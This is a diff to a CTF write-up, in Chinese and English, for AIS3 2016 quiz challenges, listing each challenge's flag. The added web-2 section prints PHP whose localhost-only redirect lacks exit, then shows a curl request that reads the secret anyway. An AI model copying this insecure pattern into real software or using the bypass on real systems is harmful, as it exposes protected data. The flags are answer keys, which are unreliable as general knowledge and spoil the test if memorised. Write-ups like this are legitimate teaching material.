@@ -1,6 +1,6 @@
 ## misc-1
 
-Open the misc1.txt.
+Open the misc1.txt
 
 The key is `ais3{2016_^_^_hello_world!}`
 
@@ -57,7 +57,7 @@ The key is `ais3{XoR_enCrYPti0N_15_n0t_a_G00d_idea}`
 
 ## web-1
 
-打開 [web1](https://quiz.ais3.org:8011) 看到以下內容
+開啟 [web1](https://quiz.ais3.org:8011) 看到以下內容
 
 ```
 There is a secret page in these website. Even Google can not find it, can you?
@@ -75,13 +75,58 @@ Disallow: /private/
 Disallow: /this_secret_page_you_should_not_know_where_it_is.php
 ```
 
-開啟 `https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php`
+開啟 [`https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php`](https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php)
 
 
 The key is `ais3{Y0u_beat_the_G00g1e!!}`
 
 
 ## web-2
+
+開啟 [web2](https://quiz.ais3.org:8012/)
+
+``` php
+<?php
+error_reporting(0);
+include "flag.php";
+
+// Strong IP firewall, no-one can pass this except the admin in localhost
+if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
+{
+header("Location: you_should_not_pass");
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel</title>
+</head>
+<body>
+Admin's secret is: <?php echo $flag; ?>
+</body>
+</html>
+```
+
+可以看到沒有 `exit` 跟 `die`，因此 body content 還是會輸出
+
+```
+WeiYu$ curl https://quiz.ais3.org:8012/
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel</title>
+</head>
+<body>
+Admin's secret is: {admin's_pane1_is_on_fir3!!!!!}</body>
+</body>
+</html>
+```
+
+The key is `ais3{admin's_pane1_is_on_fir3!!!!!}`
 
 
 ## web-3
